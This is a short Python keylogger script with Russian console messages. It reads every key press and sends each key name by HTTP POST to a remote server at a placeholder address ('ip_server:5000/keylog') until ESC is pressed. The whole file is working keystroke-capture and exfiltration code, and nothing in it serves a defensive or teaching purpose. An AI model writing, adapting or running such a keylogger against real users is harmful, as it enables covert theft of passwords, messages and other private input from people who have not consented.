import keyboard
import requests

SERVER_URL = 'http://ip_server:5000/keylog'

print("Нажмите ESC для выхода.")

while True:
    key = keyboard.read_event()
    if key.event_type == keyboard.KEY_DOWN:
        requests.post(SERVER_URL, data=key.name)
        print(f"Отправлено: {key.name}")
        if key.name == 'esc':
            break